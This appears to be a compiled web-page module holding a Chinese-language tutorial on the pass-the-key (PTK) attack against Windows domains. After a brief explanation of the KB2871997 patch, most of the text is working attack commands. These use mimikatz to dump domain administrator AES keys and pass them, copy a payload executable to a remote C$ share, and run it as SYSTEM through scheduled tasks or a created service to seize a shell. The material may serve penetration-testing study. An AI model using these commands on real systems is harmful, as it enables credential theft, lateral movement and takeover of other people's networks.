import{_ as s,W as n,X as a,a1 as e}from"./framework-b6a07282.js";const t={},i=e(`<h2 id="密钥传递攻击-ptk" tabindex="-1"><a class="header-anchor" href="#密钥传递攻击-ptk" aria-hidden="true">#</a> 密钥传递攻击（PTK）</h2><ul><li><p>密钥传递攻击（pass the key）</p></li><li><p>对于win8.1/2012r2，安装了kb2871997的win7/2008r2/2012，可以使用AES keys代替NTLM来进行验证。</p></li><li><p>只能攻击域管理员账户，只有域管有aes的密钥。</p></li></ul><h3 id="什么是kb2871997" tabindex="-1"><a class="header-anchor" href="#什么是kb2871997" aria-hidden="true">#</a> 什么是KB2871997</h3><ul><li>KB2871997：进制本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行wmi、psexec、schtasks、at和访问文件共享。</li><li>这个补丁发布后，常规的Pass The Hash已无法成功，维度默认的Administrator（SID 500）的账号例外，利用这个账号仍然可以进行PTH远程连接，即使administrator修改了名字。</li><li>但我们可以通过AES密钥来替代NTLM验证进行横向的操作。</li></ul><h3 id="攻击步骤" tabindex="-1"><a class="header-anchor" href="#攻击步骤" aria-hidden="true">#</a> 攻击步骤</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#想办法绕UAC。</span>

<span class="token number">1</span>.寻找域管的AES密钥
mimikatz sekurlsa::ekeys

<span class="token number">2</span>.	传递key
mimikatz sekurlsa::pth /user:administrator/domain:域名 /aes密钥 <span class="token comment">##命令成功后会在最初的靶机上弹出cmd，攻击完成。</span>

<span class="token number">3</span>.执行各种命令
net <span class="token function">time</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 <span class="token comment">#查看时间</span>
tasklist /s <span class="token number">192.168</span>.1.4 <span class="token comment">#查看进程</span>
<span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>c$ <span class="token comment">#查看C盘</span>

<span class="token comment">#配合计划任务攻击夺取另一台内网机器的shell</span>
copy C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>fish1<span class="token punctuation">\\</span>Desktop<span class="token punctuation">\\</span>artifact.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4<span class="token punctuation">\\</span>C$ <span class="token comment">#拷贝文件到目标主机C盘下</span>
schtasks /create /u administrator /p Aa123456 /s <span class="token number">192.168</span>.1.4 /tn shellname /sc onstart /tr c:<span class="token punctuation">\\</span>artifact.exe /ru system /f <span class="token comment">#创建计划任务</span>
schtasks /run /u administrator /p Aa123456 /s <span class="token number">192.168</span>.1.4 /i /tn <span class="token string">&quot;shellname&quot;</span> <span class="token comment">#运行计划任务</span>

schtasks /query /s <span class="token number">192.168</span>.1.4 /u administrator /p Aa123456 /TN c <span class="token comment">#查看计划任务</span>

SCHTASKS /DELETE /s controlfish.hacker.com /TN <span class="token string">&quot;shellname1&quot;</span> /f <span class="token comment">#强制删除计划任务</span>

<span class="token comment">#配合服务夺取另一台内网机器的shell</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 create servername <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">&quot;cmd.exe /c c:<span class="token entity" title="\\a">\\a</span>rtifact.exe&quot;</span> <span class="token comment">#创建服务</span>
sc <span class="token punctuation">\\</span><span class="token punctuation">\\</span><span class="token number">192.168</span>.1.4 start servername <span class="token comment">#启动服务</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6),c=[i];function l(p,o){return n(),a("div",null,c)}const u=s(t,[["render",l],["__file","密钥传递攻击（PTK）.html.vue"]]);export{u as default};
